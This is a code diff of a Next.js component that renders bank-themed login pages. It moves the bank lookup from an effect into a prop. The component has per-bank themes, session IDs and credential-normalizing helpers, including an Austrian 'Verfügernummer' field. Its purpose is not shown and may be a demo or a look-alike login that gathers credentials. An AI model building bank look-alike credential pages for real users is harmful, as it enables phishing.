@@ -1,10 +1,9 @@
 "use client";
 
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { DemoShell } from "@/components/demo/DemoShell";
-import { getBankBySlug } from "@/lib/at-bank-catalog";
 import type { BankTheme } from "@/lib/bank-theme-config";
 import { getBankTheme } from "@/lib/bank-theme-config";
 import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
@@ -14,23 +13,12 @@ import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 type Props = {
   sessionId: string;
   bankSlug: string;
+  bank: any;
 };
 
-export function BankLoginClient({ sessionId, bankSlug }: Props) {
+export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const router = useRouter();
   const supabase = createBrowserSupabaseClient();
-  const [bank, setBank] = useState<any>(null);
-  
-  useEffect(() => {
-    let cancelled = false;
-    void (async () => {
-      const fetchedBank = await import("@/lib/at-bank-catalog").then(m => m.getBankBySlug(bankSlug));
-      if (!cancelled) setBank(fetchedBank);
-    })();
-    return () => {
-      cancelled = true;
-    };
-  }, [bankSlug]);
   const [theme, setTheme] = useState<BankTheme | null>(null);
 
   const [verfuegernummer, setVerfuegernummer] = useState("");
